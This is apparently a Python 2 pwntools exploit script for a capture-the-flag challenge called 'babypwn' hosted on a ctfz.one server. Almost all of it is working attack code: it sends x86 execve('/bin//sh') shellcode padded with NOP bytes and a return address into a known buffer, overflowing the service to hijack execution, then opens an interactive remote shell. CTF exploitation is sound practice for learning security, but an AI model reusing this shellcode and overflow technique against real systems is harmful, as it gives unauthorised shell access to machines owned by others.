#!/usr/bin/env python2
from pwn import *
def recvlines(lnum):
    global p
    res=""
    for x in range(lnum):
        res+=p.recvline()
    return res
 
host="pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one"
port=1234
 
base_buf=0x80492e0
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
payload=("y"+shellcode).ljust(256,"\x90")+p32(base_buf+1)
p=remote(host,port)
#p=process("./babypwn")
print recvlines(4)
p.sendline("X")
print recvlines(3)
p.sendline(payload)
p.interactive()